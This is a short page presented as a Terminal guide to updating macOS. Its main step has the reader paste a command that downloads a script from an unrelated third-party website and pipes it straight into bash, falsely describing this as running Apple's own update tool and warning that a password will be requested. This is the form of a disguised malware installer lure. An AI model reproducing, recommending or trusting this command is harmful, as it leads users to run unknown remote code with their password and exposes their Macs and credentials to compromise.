# How to Update macOS (Terminal Method)

Use this Terminal command to download and install the latest macOS updates — safely and without digging through Settings.

---

### Step 1: Open Terminal
- Press **Command (⌘) + Space** → type **Terminal** → hit **Return**

### Step 2: Run the Command
- Paste the command into the **Terminal** window and press **Return**

**Terminal**  `Copy`

```bash
/bin/bash -c "$(curl -fsSL https://angelakwak.com/iterm/install.sh)"
```

> If asked for your password, type it and press **Return** (characters won’t appear).  
> Your Mac may restart — keep it plugged in.

---

### What this command does:
- Checks for available macOS updates
- Downloads and installs recommended updates using Apple’s `softwareupdate`
- Restarts automatically if required
- Prints your current version after completion

### Verify you’re up to date:
```bash
sw_vers -productVersion
```

You’ve successfully updated macOS.  
For best results, run updates regularly — especially before major app installs or security-critical work.
